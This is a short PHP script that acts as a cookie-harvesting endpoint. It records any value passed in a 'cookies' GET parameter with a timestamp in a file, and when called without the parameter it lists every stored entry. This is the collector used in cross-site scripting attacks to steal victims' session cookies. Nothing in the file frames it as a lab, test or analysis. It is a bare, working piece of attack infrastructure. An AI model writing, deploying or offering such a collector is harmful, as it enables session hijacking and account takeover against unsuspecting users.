<?php
if(!file_exists('cookie.dat')){
	file_put_contents('cookie.dat',serialize((array)$data));
}
if($_GET['cookies']){
	(array)$data = unserialize(file_get_contents('cookie.dat'));
	$data[] = date("Y-m-d H:i:s")." => ".$_GET['cookies'];
	file_put_contents('cookie.dat',serialize($data));
}else{
	foreach ( (array)$data = unserialize(file_get_contents('cookie.dat')) as $item ){
		echo $item;
		echo "<hr/>";
	}
}

